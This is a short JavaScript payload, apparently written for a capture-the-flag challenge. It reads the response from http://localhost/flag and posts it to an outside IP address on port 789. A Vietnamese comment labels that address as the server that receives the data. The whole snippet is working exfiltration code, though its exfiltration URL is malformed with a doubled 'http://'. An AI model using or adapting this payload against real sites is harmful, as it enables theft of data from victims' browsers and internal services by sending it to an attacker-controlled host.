var xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost/flag", true);
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
        var request = new XMLHttpRequest();
        request.open("POST", "http://http://103.161.96.250:789/log", true); // Server nhận dữ liệu
        request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        request.send("data=" + encodeURIComponent(xhr.responseText));
    }
};
xhr.send();
